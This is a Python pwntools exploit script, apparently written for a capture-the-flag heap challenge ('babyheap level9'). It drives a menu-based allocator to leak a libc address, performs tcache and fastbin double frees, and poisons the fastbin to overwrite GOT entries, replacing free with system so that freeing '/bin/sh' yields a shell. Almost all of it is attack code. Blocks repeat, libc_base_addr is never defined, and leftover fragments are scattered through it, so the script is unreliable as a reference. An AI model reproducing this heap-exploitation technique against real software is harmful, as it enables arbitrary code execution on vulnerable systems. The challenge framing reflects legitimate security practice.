from pwn import *




r = process('./babyheap_babyheap_level9_testing1')
#print(r.clean())



# set up layout of unsorted bins
# make sure chunk is larger than fastbin
# malloc 10 times
for i in range(10):
	r.sendafter("Choice:", '1')
	r.sendafter("Size", '768')
	r.sendafter("Content", '0')
	#r.send('1')
	#r.send('768')
	#r.send(b"%d" % 762)
	#r.send(b'%b' % b'0')
	#r.send('0')
	#print(r.clean())

"""
r.send('1')
r.send('768')
r.send('0')
print(r.clean())
"""
# fill tcache
# free seven times

for i in range(7):
	r.send('3')
	r.send(b"%d" % i)
	#r.send(str(i))
	print(r.clean())

"""
r.send('3')

pritn(r.clean())
"""

# free an 8th time
r.send('3')
r.send('7')
print(r.clean())

# get the leak
r.send('4')
r.send('7')
print(r.clean())

# clear tcache and fastbin
for i in range(8):
	r.send('1')
	r.send(b"%d" % 762)
	#r.send('762')
	r.send(b'%b' % b'0')
	#r.send('0')
	print(r.clean())
# set breakpoint here**

# read content of unsorted bin that starts with 7f
#  use gef vmmap to get base

# current pointer - current base = offset 

# addr - offset 

# !!!!!!!!!!!!!!!!!!
# level 9 offset = 0x3ebca0




# fill tcache bin with 7 chunks and 2 chunks for fastbin

for i in range(9):
	r.send('1')
	r.send('8')
	r.send('0')
	print(r.clean())

"""
r.send('1')
r.send('8')
r.send('0')
print(r.clean())

"""

for i in range(10, 17):
	r.send('3')
	r.send(str(i))
	print(r.clean())
"""
r.send('3')

"""

# double free for fastbin
r.send('3')
r.send('17')
print(r.clean())

r.send('3')
r.send('18')
print(r.clean())

r.send('3')
r.send('17')
print(r.clean())


# empty tcache bins  (index [10-16])
for i in range(7):
	r.send('1')
	r.send('8')
	r.send('0')
	print(r.clean())
"""
r.send('1')
r.send('8')
r.send('0')
print(r.clean())

"""
content = r.elf.got['exit']
r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())


# link vuln chunk to fake chunk 


# malloc three times, the third malloc returns the fake chunk
r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())

r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())






# ___________________________________-



for i in range(9):
	r.send('1')
	r.send('34')
	r.send('0')
	print(r.clean())

"""
r.send('1')
r.send('34')
r.send('0')
r.clean()

"""





# free seven times
for i in range(22, 22+7):
	r.send('3')
	r.send(str(i))
	print(r.clean())


# double free for fastbin
r.send('3')
r.send('29')
print(r.clean())

r.send('3')
r.send('30')
print(r.clean())

r.send('3')
r.send('29')
print(r.clean())

# ____________________-

# malloc seven times
for i in range(7):
	r.send('1')
	r.send('34')
	r.send('0')
	print(r.clean())
"""
r.send('1')
r.send('34')
r.send('0')
r.clean()
"""





content = r.elf.got['free']
r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())


# malloc three times, the third malloc returns the fake chunk
r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())

r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())



libc_system_addr = libc_base_addr + 0x4f4e0
r.send('1')
r.send('34')
r.send(p64(libc_system_addr))
print(r.clean())



# send string /bin/sh to free which should be  bin/sh
r.send('1')
r.send('50')
binsh_string = b'/bin/sh\x00'
r.send(binsh_string)

































# fill tcache bin with 7 chunks and 2 chunks for fastbin

for i in range(9):
	r.send('1')
	r.send('8')
	r.send('0')
	print(r.clean())

"""
r.send('1')
r.send('8')
r.send('0')
r.clean()

"""


for i in range(7):
	r.send('3')
	r.send(str(i))
	print(r.clean())

"""
r.send('3')
r.send(str(i))
print(r.clean())
"""

# double free for fastbin
r.send('3')
r.send('7')
print(r.clean())

r.send('3')
r.send('8')
print(r.clean())

r.send('3')
r.send('7')
print(r.clean())

# empty tcache bins  (index [9-15])
for i in range(7):
	r.send('1')
	r.send('8')
	r.send('0')
	print(r.clean())

"""
r.send('1')
r.send('8')
r.send('0')
"""
# malloc to get the vuln chunk (index 8) and use got printf
#libc_base_addr = 0x0 - 0x80a30
content = r.elf.got['puts']
r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())


# link vuln chunk to fake chunk 


# malloc three times, the third malloc returns the fake chunk
r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())

r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())

"""
r.send('1')
r.send('8')
r.send(p64(content))
print(r.clean())
"""

# value 
#value = libc_base_addr + 0x0e59d0
# overwrite puts@got with printf@got
value = r.elf.got['printf']
r.send('1')
r.send('8')
r.send(p64(value))
print(r.clean())


r.send('1')
r.send('8')
r.send(b'%10$llx')
print(r.clean())

#r.send('6')



"""
_________________________________________________________________________________
OVERWRITE BINSH

"""


for i in range(9):
	r.send('1')
	r.send('34')
	r.send('0')
	print(r.clean())



for i in range(11, 11+7):
	if(i > 17):
		break
	r.send('3')
	r.send(str(i))
	print(r.clean())


# double free for fastbin
r.send('3')
r.send('18')
print(r.clean())

r.send('3')
r.send('19')
print(r.clean())

r.send('3')
r.send('18')
print(r.clean())

# empty tcache bins  (index [9-15])
for i in range(7):
	r.send('1')
	r.send('34')
	r.send('0')
	print(r.clean())




content = r.elf.got['free']
r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())


# malloc three times, the third malloc returns the fake chunk
r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())

r.send('1')
r.send('34')
r.send(p64(content))
print(r.clean())



libc_system_addr = libc_base_addr + 0x4f4e0
r.send('1')
r.send('34')
r.send(p64(libc_system_addr))
print(r.clean())



# send string /bin/sh to free which should be  bin/sh
r.send('1')
r.send('50')
binsh_string = b'/bin/sh\x00'
r.send(binsh_string)